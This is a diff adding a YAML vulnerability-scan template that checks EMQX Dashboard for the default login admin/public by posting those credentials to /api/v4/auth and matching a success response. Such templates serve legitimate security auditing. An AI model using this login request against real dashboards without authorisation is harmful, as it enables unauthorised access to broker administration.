@@ -1,0 +1,31 @@
+id: poc-yaml-emqx-dashboard-weak-pass
+info:
+  name: EMQX Dashboard Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+variables:
+  username: admin
+  password: public
+http:
+  - raw:
+      - |
+        POST /api/v4/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"code":0}'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
